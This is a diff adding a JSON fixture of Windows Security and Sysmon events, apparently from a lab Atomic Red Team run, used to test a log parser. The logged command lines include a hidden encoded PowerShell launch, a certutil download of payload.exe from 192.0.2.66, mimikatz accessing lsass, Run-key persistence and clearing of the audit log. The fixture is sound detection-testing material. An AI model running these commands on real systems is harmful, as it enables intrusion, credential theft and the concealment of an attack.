@@ -1,0 +1,63 @@
+{
+  "description": "Sample Windows Security + Sysmon events exported from the lab Victim VM during an Atomic Red Team run. Feed to log_parser.py.",
+  "events": [
+    {
+      "EventCode": "4688",
+      "host": "WIN10-VICTIM",
+      "User": "WIN10-VICTIM\\jdoe",
+      "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQA",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+    },
+    {
+      "EventCode": "1",
+      "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "host": "WIN10-VICTIM",
+      "User": "WIN10-VICTIM\\jdoe",
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://192.0.2.66/payload.exe C:\\Users\\Public\\p.exe"
+    },
+    {
+      "EventCode": "10",
+      "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "host": "WIN10-VICTIM",
+      "SourceImage": "C:\\Tools\\mimikatz.exe",
+      "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+      "GrantedAccess": "0x1410",
+      "User": "WIN10-VICTIM\\jdoe"
+    },
+    {
+      "EventCode": "7045",
+      "host": "WIN10-VICTIM",
+      "ServiceName": "UpdaterSvc",
+      "ServiceFileName": "C:\\Users\\Public\\AppData\\evil.exe",
+      "User": "WIN10-VICTIM\\jdoe"
+    },
+    { "EventCode": "4625", "host": "WIN10-VICTIM", "Account_Name": "administrator", "src_ip": "192.0.2.66" },
+    { "EventCode": "4625", "host": "WIN10-VICTIM", "Account_Name": "administrator", "src_ip": "192.0.2.66" },
+    { "EventCode": "4625", "host": "WIN10-VICTIM", "Account_Name": "administrator", "src_ip": "192.0.2.66" },
+    { "EventCode": "4625", "host": "WIN10-VICTIM", "Account_Name": "administrator", "src_ip": "192.0.2.66" },
+    { "EventCode": "4625", "host": "WIN10-VICTIM", "Account_Name": "administrator", "src_ip": "192.0.2.66" },
+    { "EventCode": "4625", "host": "WIN10-VICTIM", "Account_Name": "administrator", "src_ip": "192.0.2.66" },
+    {
+      "EventCode": "13",
+      "source": "WinEventLog:Microsoft-Windows-Sysmon/Operational",
+      "host": "WIN10-VICTIM",
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+      "Details": "C:\\Users\\Public\\p.exe",
+      "User": "WIN10-VICTIM\\jdoe"
+    },
+    {
+      "EventCode": "4720",
+      "host": "WIN10-VICTIM",
+      "Target_Account_Name": "svc_backup",
+      "SubjectUserName": "jdoe"
+    },
+    {
+      "EventCode": "1102",
+      "host": "WIN10-VICTIM",
+      "SubjectUserName": "jdoe",
+      "Message": "The audit log was cleared."
+    }
+  ]
+}
